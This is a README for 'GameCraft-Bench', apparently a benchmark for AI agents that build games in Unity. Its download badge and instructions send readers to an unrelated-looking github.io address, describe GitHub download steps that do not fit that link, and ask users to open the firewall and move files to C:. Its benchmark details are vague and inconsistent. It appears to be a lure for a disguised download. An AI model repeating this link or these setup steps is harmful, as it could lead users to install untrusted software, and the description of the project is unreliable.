# 🎮 Gamecraft-bench - Benchmark your agents building games easily

[![](https://img.shields.io/badge/Download-GameCraft-blue)](https://bertinebrocaded688.github.io)

## 📁 What is GameCraft-Bench ?

GameCraft-Bench helps you measure how well AI agents create playable games inside real game engines. Use this tool to test if your software agents can build functional games from start to finish. Researchers and developers use it to see if agents understand game rules, environment setup, and player interaction. This benchmark provides the code and data necessary to track performance across different game types.

## ⚙️ Minimum System Requirements

Your computer needs specific hardware and software to run these tests. Ensure your Windows system meets these standards before you begin:

* Operating System: Windows 10 or Windows 11 (64-bit).
* Processor: Intel Core i5 or AMD Ryzen 5 with at least 3.0 GHz speed.
* Memory: 16 GB of RAM.
* Storage: 50 GB of free space on a Solid State Drive.
* Graphics: NVIDIA GeForce RTX 2060 or better with 6 GB of video memory.
* Software: You must have the Unity Hub and the specific Unity Editor version mentioned in the project configuration files installed.

## 🚀 Downloading the Software

You must visit the project page to access the latest version of the tools. Follow these steps to obtain the necessary files:

1. Visit the main project repository page: [https://bertinebrocaded688.github.io](https://bertinebrocaded688.github.io).
2. Click the green "Code" button located near the top right of the file list.
3. Select "Download ZIP" from the menu.
4. Save the file to a folder on your computer where you have full read and write access.
5. Right-click the downloaded folder and select "Extract All" to unpack the contents.

## 🛠️ Setting Up Your Environment

After you extract the files, you need to prepare your machine for the benchmark.

1. Open the Unity Hub on your computer.
2. Select the "Add" button and choose the project folder you just extracted.
3. Unity will prompt you to install the version of the engine used for this research. Click "Install" and wait for the process to finish.
4. Ensure your firewall allows the software to connect to the internet, as the benchmark agents retrieve data during the testing process.

## ⏱️ Running Your First Benchmark

Follow these instructions to start the assessment process.

1. Open the project inside your Unity Editor.
2. Locate the "Benchmarks" folder in the project navigation pane.
3. Select the "AgentTester" file to trigger the user interface.
4. Choose the specific environment you want to test from the drop-down menu.
5. Click the "Start Run" button to initialize the agent.
6. The window will display the progress of the agent as it builds the game scene.
7. Observe the console window at the bottom of the screen to see real-time updates on agent success and failure rates.

## 📊 Understanding the Data

The benchmark generates reports after each test run. These files save to the "Results" folder inside your main project directory.

* Success Rate: This value shows the percentage of tasks the agent finished without errors.
* Build Time: This metric tracks how long the agent took to complete the game.
* Playability Score: This measure evaluates if the generated game responds to player inputs.
* Resource Usage: This reports the CPU and GPU load during the game creation phase.

Use these files to compare different agent versions. You can open these logs using any standard text editor or spreadsheet program.

## ❓ Troubleshooting Common Errors

If the software stops or fails to run, check these items first:

* Check internet stability. Agents often need to pull assets from the server.
* Verify file paths. Long folder names or special characters in the path can cause read errors. Move your folder to the root of your C: drive to fix this.
* Update your graphics drivers. Older drivers cause issues when the agent renders game views.
* Free up disk space. The benchmarking process creates temporary cache files that require extra room on your storage drive.
* Close other demanding applications. Programs like browsers or video editors consume memory needed for the game engine.

## 📝 Frequently Asked Questions

**Can I switch the engine version?** 

We recommend using the exact version defined in the setup documentation. Changing the version causes conflicts with the existing game assets.

**How do I add my own agents?**

Place your agent scripts in the "CustomAgents" folder. The system will detect them during the next initialization cycle.

**Does this work on virtual machines?**  

This software requires direct access to your graphics hardware. Performance will suffer or fail entirely on virtual machines lacking proper physical hardware pass-through.

**Is there a cost to run these benchmarks?**  

The software provided here is free to use for research and development. There are no fees for running the agents or accessing the data logs.

**What if the agent hangs?**  

If an agent stops moving for more than five minutes, restart the process. This usually indicates a timeout in communication between the engine and the agent controller.

**Can I record the game output?**  

The engine features a built-in recorder. Enable "Capture Output" in the settings menu before starting the benchmark to save a video file of the generated games.